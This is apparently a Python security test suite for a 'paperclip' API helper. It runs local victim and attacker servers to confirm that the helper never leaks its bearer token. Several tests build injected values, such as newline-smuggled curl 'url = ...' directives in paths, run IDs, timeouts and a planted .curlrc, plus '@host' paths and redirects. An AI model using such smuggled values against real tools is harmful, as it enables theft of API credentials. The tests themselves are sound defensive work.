#!/usr/bin/env python3
"""Exercise the shell API helper with hostile curl values and a synthetic key."""

from __future__ import annotations

import http.server
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import threading
import time
import unittest
import uuid


HELPER = Path(__file__).with_name("paperclip-api.sh")
UPLOAD_HELPER = Path(__file__).with_name("paperclip-upload-artifact.sh")
PYTHON_HELPER = Path(__file__).with_name("paperclip-api.py")


def process_tree(root_pid):
    pids = {root_pid}
    pending = [root_pid]
    while pending:
        pid = pending.pop()
        try:
            children = (Path("/proc") / str(pid) / "task" / str(pid) / "children").read_text().split()
        except (FileNotFoundError, PermissionError, ProcessLookupError):
            continue
        for child in children:
            child_pid = int(child)
            if child_pid not in pids:
                pids.add(child_pid)
                pending.append(child_pid)
    return pids


def token_in_proc_argv(token, pids):
    for pid in pids:
        try:
            if token in (Path("/proc") / str(pid) / "cmdline").read_bytes():
                return True
        except (FileNotFoundError, PermissionError, ProcessLookupError):
            continue
    return False


def wait_for_token_in_proc_argv(token, process, timeout=5):
    deadline = time.monotonic() + timeout
    while process.poll() is None:
        if token_in_proc_argv(token, process_tree(process.pid)):
            return True
        if time.monotonic() >= deadline:
            break
        time.sleep(0.01)
    return False


def token_in_ps_argv(token, pids):
    result = subprocess.run(
        ["ps", "-ww", "-p", ",".join(map(str, sorted(pids))), "-o", "args="],
        capture_output=True, check=False,
    )
    return token in result.stdout


class Recorder:
    def __init__(self):
        self.requests = []
        self.redirect_to = None
        self.seen = threading.Event()
        self.release = threading.Event()
        self.release.set()
        owner = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def handle_request(self):
                size = int(self.headers.get("Content-Length", "0"))
                owner.requests.append((self.command, self.path, dict(self.headers), self.rfile.read(size)))
                owner.seen.set()
                owner.release.wait(timeout=5)
                if self.command == "GET" and self.path == "/api/redirect" and owner.redirect_to:
                    self.send_response(302)
                    self.send_header("Location", owner.redirect_to)
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                    return
                if self.command == "GET" and self.path == "/api/issues/x/attachments":
                    response = b"[]"
                elif self.command == "POST" and self.path == "/api/companies/c/issues/x/attachments":
                    response = (b'{"id":"attachment-1","contentPath":"/attachments/1/content",'
                                b'"downloadPath":"/attachments/1/download","byteSize":19}')
                elif self.command == "POST" and self.path == "/api/issues/x/work-products":
                    response = b'{"id":"work-product-1"}'
                else:
                    response = b"{}"
                self.send_response(200)
                self.send_header("Content-Length", str(len(response)))
                self.end_headers()
                self.wfile.write(response)

            do_GET = handle_request
            do_POST = handle_request

            def log_message(self, *_args):
                pass

        self.server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()

    @property
    def url(self):
        return "http://127.0.0.1:%d" % self.server.server_port

    def close(self):
        self.release.set()
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=2)


class ApiHelperSecurityTest(unittest.TestCase):
    def setUp(self):
        self.scratch = tempfile.TemporaryDirectory(prefix="paperclip-api-security-")
        self.victim = Recorder()
        self.attacker = Recorder()
        self.token = "SENTINEL." + uuid.uuid4().hex + ".NOTAREALJWT"
        self.env = dict(
            os.environ,
            PAPERCLIP_API_URL=self.victim.url + "/api",
            PAPERCLIP_API_KEY=self.token,
            PAPERCLIP_RUN_ID="synthetic-run-id",
            PAPERCLIP_RUN_SCRATCH_DIR=self.scratch.name,
            PC_TEST_HELPER=os.environ.get("PC_TEST_HELPER", str(HELPER)),
        )

    def tearDown(self):
        self.victim.close()
        self.attacker.close()
        self.scratch.cleanup()

    def call(self, script, **updates):
        env = dict(self.env, **updates)
        return subprocess.run(
            ["bash", "-c", '. "$PC_TEST_HELPER"; ' + script],
            env=env,
            capture_output=True,
            text=True,
            timeout=15,
        )

    def injected_path(self, stem):
        path = self.scratch.name + '/' + stem + '"\nurl = "' + self.attacker.url + '/stolen'
        os.makedirs(os.path.dirname(path), exist_ok=True)
        return path

    def assert_one_target(self, method, path, payload=None):
        self.assertEqual(len(self.victim.requests), 1)
        self.assertEqual(len(self.attacker.requests), 0)
        request_method, request_path, headers, body = self.victim.requests[0]
        self.assertEqual((request_method, request_path), (method, path))
        self.assertEqual(headers.get("Authorization"), "Bearer " + self.token)
        if payload is not None:
            self.assertIn(payload, body)

    def upload_artifact(self, run_id, *, work_product=True):
        upload = Path(self.scratch.name) / 'artifact"\\sample.txt'
        upload.write_text("safe-upload-payload")
        env = dict(
            self.env,
            PAPERCLIP_RUN_ID=run_id,
            PAPERCLIP_HELPER_STATE_DIR=self.scratch.name + "/locks",
        )
        args = ["bash", str(UPLOAD_HELPER), str(upload), "--content-type", "text/plain",
                "--output", "json", "--company-id", "c", "--issue-id", "x"]
        if not work_product:
            args.append("--no-work-product")
        return subprocess.run(args, env=env, capture_output=True, text=True, timeout=15)

    def call_python(self, run_id, *, method="POST"):
        return subprocess.run(
            [sys.executable, str(PYTHON_HELPER), method, "/api/issues/x/comments", '{"ok":true}'],
            env=dict(self.env, PAPERCLIP_RUN_ID=run_id),
            capture_output=True, text=True, timeout=15,
        )

    def test_get_and_url_globbing_make_one_request(self):
        result = self.call('pc_api GET "$PC_TEST_PATH"', PC_TEST_PATH="/api/{one,two}")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assert_one_target("GET", "/api/{one,two}")

    def test_curl_defaults_cannot_add_an_attacker_url(self):
        curl_home = Path(self.scratch.name) / "curl-home"
        curl_home.mkdir()
        (curl_home / ".curlrc").write_text('url = "' + self.attacker.url + '/stolen"\n')
        result = self.call("pc_api GET /api/agents/me", CURL_HOME=str(curl_home))
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assert_one_target("GET", "/api/agents/me")

    def test_post_reads_body_file_with_quote_and_backslash(self):
        body_file = Path(self.scratch.name) / 'body"\\sample.json'
        body_file.write_text('{"value":"safe"}')
        result = self.call(
            'pc_api POST /api/issues/x/comments "$PC_TEST_BODY"',
            PC_TEST_BODY=str(body_file),
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assert_one_target("POST", "/api/issues/x/comments", b'"value":"safe"')

    def test_upload_reads_file_with_quote_and_backslash(self):
        upload = Path(self.scratch.name) / 'upload"\\sample.txt'
        upload.write_text("safe-upload-payload")
        result = self.call(
            'pc_api_upload /api/issues/x/attachments "$PC_TEST_FILE" text/plain',
            PC_TEST_FILE=str(upload),
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assert_one_target("POST", "/api/issues/x/attachments", b"safe-upload-payload")

    def test_artifact_uploader_reads_file_with_quote_and_backslash(self):
        run_id = 'synthetic"\\run-id'
        result = self.upload_artifact(run_id)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(len(self.victim.requests), 3)
        self.assertEqual(len(self.attacker.requests), 0)
        self.assertEqual([request[:2] for request in self.victim.requests], [
            ("GET", "/api/issues/x/attachments"),
            ("POST", "/api/companies/c/issues/x/attachments"),
            ("POST", "/api/issues/x/work-products"),
        ])
        for _, _, headers, _ in self.victim.requests:
            self.assertEqual(headers.get("Authorization"), "Bearer " + self.token)
            self.assertEqual(headers.get("X-Paperclip-Run-Id"), run_id)
        self.assertIn(b"safe-upload-payload", self.victim.requests[1][3])
        self.assertEqual(json.loads(self.victim.requests[2][3])["createdByRunId"], run_id)

    def test_artifact_uploader_rejects_curl_config_directive_before_network(self):
        run_id = 'synthetic"\nurl = "' + self.attacker.url + '/stolen'
        result = self.upload_artifact(run_id)
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("PAPERCLIP_RUN_ID contains a control character", result.stderr)
        self.assertNotIn(self.token, result.stderr)
        self.assertEqual(self.victim.requests, [])
        self.assertEqual(self.attacker.requests, [])

    def test_artifact_uploader_rejects_each_header_control_before_network(self):
        for control in ("\r", "\n", "\t", "\x1f", "\x7f", "\x85"):
            with self.subTest(control=repr(control)):
                result = self.upload_artifact("run" + control + "id")
                self.assertNotEqual(result.returncode, 0)
                self.assertEqual(self.victim.requests, [])
                self.assertEqual(self.attacker.requests, [])

    def test_python_helper_rejects_header_controls_before_network(self):
        injected = 'run"\nurl = "' + self.attacker.url + '/stolen'
        for run_id in (injected, "run\rid", "run\tid", "run\x1fid", "run\x7fid", "run\x85id"):
            with self.subTest(run_id=repr(run_id)):
                result = self.call_python(run_id)
                self.assertNotEqual(result.returncode, 0)
                self.assertIn("PAPERCLIP_RUN_ID contains a control character", result.stderr)
                self.assertNotIn(self.token, result.stdout + result.stderr)
                self.assertEqual(self.victim.requests, [])
                self.assertEqual(self.attacker.requests, [])

    def test_python_helper_accepts_valid_run_id_and_json(self):
        run_id = 'synthetic"\\run-id'
        result = self.call_python(run_id)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assert_one_target("POST", "/api/issues/x/comments", b'{"ok": true}')
        self.assertEqual(self.victim.requests[0][2].get("X-Paperclip-Run-Id"), run_id)

    def test_python_helper_does_not_follow_cross_origin_redirect(self):
        direct = subprocess.run(
            [sys.executable, str(PYTHON_HELPER), "GET", "/api/agents/me"],
            env=self.env, capture_output=True, text=True, timeout=15,
        )
        self.assertEqual(direct.returncode, 0, direct.stderr)
        self.assertTrue(direct.stdout.startswith("200\n"), direct.stdout)
        self.assert_one_target("GET", "/api/agents/me")

        self.victim.requests.clear()
        self.victim.redirect_to = self.attacker.url + "/stolen"
        redirected = subprocess.run(
            [sys.executable, str(PYTHON_HELPER), "GET", "/api/redirect"],
            env=self.env, capture_output=True, text=True, timeout=15,
        )
        self.assertEqual(redirected.returncode, 1, redirected.stderr)
        self.assertTrue(redirected.stdout.startswith("302\n"), redirected.stdout)
        self.assert_one_target("GET", "/api/redirect")
        self.assertEqual(self.victim.requests[0][2].get("X-Paperclip-Run-Id"), "synthetic-run-id")
        self.assertNotIn(self.token, redirected.stdout + redirected.stderr)

    def test_python_helper_rejects_authority_like_path_before_network(self):
        path = "@" + self.attacker.url.removeprefix("http://") + "/stolen"
        result = subprocess.run(
            [sys.executable, str(PYTHON_HELPER), "GET", path],
            env=self.env, capture_output=True, text=True, timeout=15,
        )
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("API path must start with /", result.stderr)
        self.assertNotIn(self.token, result.stdout + result.stderr)
        self.assertEqual(self.victim.requests, [])
        self.assertEqual(self.attacker.requests, [])

    @unittest.skipUnless(Path("/proc/self/cmdline").exists(), "Linux /proc required")
    def test_python_helper_keeps_bearer_out_of_proc_and_ps(self):
        token = self.token.encode()
        control = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(10)", self.token])
        try:
            self.assertFalse(wait_for_token_in_proc_argv(b"absent." + token, control, timeout=0.05))
            self.assertTrue(wait_for_token_in_proc_argv(token, control), "RED control missed /proc argv")
            self.assertTrue(token_in_ps_argv(token, process_tree(control.pid)), "RED control missed ps argv")
        finally:
            control.terminate()
            control.wait(timeout=5)

        self.victim.release.clear()
        process = subprocess.Popen(
            [sys.executable, str(PYTHON_HELPER), "POST", "/api/issues/x/comments", '{"ok":true}'],
            env=self.env, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )
        try:
            self.assertTrue(self.victim.seen.wait(timeout=5), "Python helper did not reach target")
            self.assertFalse(token_in_proc_argv(token, process_tree(process.pid)))
            self.assertFalse(token_in_ps_argv(token, process_tree(process.pid)))
        finally:
            self.victim.release.set()
            try:
                stdout, stderr = process.communicate(timeout=10)
            except subprocess.TimeoutExpired:
                process.kill()
                process.communicate()
                raise
        self.assertEqual(process.returncode, 0, stderr)
        self.assertNotIn(self.token, stdout + stderr)
        self.assert_one_target("POST", "/api/issues/x/comments", b'{"ok": true}')

    def test_path_cannot_add_an_attacker_url(self):
        injected = '/api/agents/me"\nurl = "' + self.attacker.url + "/stolen"
        self.call('pc_api GET "$PC_TEST_PATH"', PC_TEST_PATH=injected)
        self.assertEqual(len(self.attacker.requests), 0)
        self.assertLessEqual(len(self.victim.requests), 1)

    def test_shell_helpers_reject_authority_like_path_before_network(self):
        path = "@" + self.attacker.url.removeprefix("http://") + "/stolen"
        upload = Path(self.scratch.name) / "safe-upload.txt"
        upload.write_text("safe-upload-payload")
        for script in (
            'pc_api GET "$PC_TEST_PATH"',
            'pc_api_upload "$PC_TEST_PATH" "$PC_TEST_FILE" text/plain',
        ):
            with self.subTest(script=script):
                result = self.call(
                    script, PC_TEST_PATH=path, PC_TEST_FILE=str(upload),
                )
                self.assertNotEqual(result.returncode, 0)
                self.assertIn("API path must start with /", result.stderr)
                self.assertNotIn(self.token, result.stdout + result.stderr)
                self.assertEqual(self.victim.requests, [])
                self.assertEqual(self.attacker.requests, [])

    def test_api_url_cannot_add_an_attacker_url(self):
        injected = self.victim.url + '/api"\nurl = "' + self.attacker.url + "/stolen"
        self.call("pc_api GET /api/agents/me", PAPERCLIP_API_URL=injected)
        self.assertEqual(len(self.attacker.requests), 0)
        self.assertLessEqual(len(self.victim.requests), 1)

    def test_timeout_cannot_add_an_attacker_url(self):
        injected = '4\nurl = "' + self.attacker.url + '/stolen"'
        self.call("pc_api GET /api/agents/me", PC_API_MAX_TIME=injected)
        self.assertEqual(len(self.attacker.requests), 0)
        self.assertLessEqual(len(self.victim.requests), 1)

    def test_body_file_path_cannot_add_an_attacker_url(self):
        body_file = self.injected_path("body")
        Path(body_file).write_text('{"value":"safe"}')
        result = self.call(
            'pc_api POST /api/issues/x/comments "$PC_TEST_BODY"',
            PC_TEST_BODY=body_file,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assert_one_target("POST", "/api/issues/x/comments", b'"value":"safe"')

    def test_output_path_cannot_add_an_attacker_url(self):
        scratch = self.injected_path("output")
        os.makedirs(scratch, exist_ok=True)
        result = self.call(
            "pc_api GET /api/agents/me",
            PAPERCLIP_RUN_SCRATCH_DIR=scratch,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assert_one_target("GET", "/api/agents/me")

    def test_upload_form_cannot_add_an_attacker_url(self):
        injected_file = self.injected_path("upload")
        Path(injected_file).write_text("safe-upload-payload")
        result = self.call(
            'pc_api_upload /api/issues/x/attachments "$PC_TEST_FILE" text/plain',
            PC_TEST_FILE=injected_file,
        )
        self.assertEqual(len(self.attacker.requests), 0)
        if result.returncode == 0:
            self.assert_one_target("POST", "/api/issues/x/attachments", b"safe-upload-payload")


if __name__ == "__main__":
    unittest.main()
